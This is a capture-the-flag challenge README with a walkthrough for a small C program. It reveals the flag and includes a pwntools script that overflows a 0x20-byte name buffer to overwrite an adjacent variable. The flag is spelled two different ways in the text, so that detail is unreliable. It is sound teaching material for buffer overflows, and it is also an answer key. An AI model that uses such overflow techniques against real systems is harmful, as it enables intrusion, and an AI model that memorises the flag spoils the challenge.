# Test Your Luck
Created by Tyr Rex.

To test locally:
- Run `docker compose up` in the directory to start the server.
- Then find the ip of the container with `docker inspect -f "{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}" luck`
- Then connect to the server with `nc`

or use `ncat`:
```
# start the server
ncat -l -k -v -p 11001 -e ./luck
# connect to the server
ncat localhost 11001
```

<details>
    <summary>Flag</summary>
    <code>flag{y0u_lucky_d1no_duck}</code>
</details>

## Files Provided
- `luck`
- `luck.c`

## Tools
- Python

## Steps to Solve

<details>
<summary>Steps to Solve</summary>

We have two varibles `char name[0x20]` and `unsigned long long luck`. The program first sets `luck`
to some random number between `1` and `0xCAFEBABE`. Then it asks for your name, which sets
`char name[0x20]` to the input using `fgets`. The `fgets` incorrectly limits the input to `0x30`
bytes. Then it checks whether `luck` is equal to `0xDEADBEEF`.

We can buffer overflow `name` and change `luck` when inputting something. 
```py
from pwn import *
# CHANGE IP
c = remote("<DOCKER-CONTAINER-IP>", "11001")
print(c.recv())
c.sendline(b'a' * 0x20 + b'\xEF\xBE\xAD\xDE\x00\x00\x00\x00\n')
print(c.recv())
print(c.recv())
```

Running the above script, we see `flag{y0u_lucky_d1n0_duck}`. woot \\(^_^)/
</details>
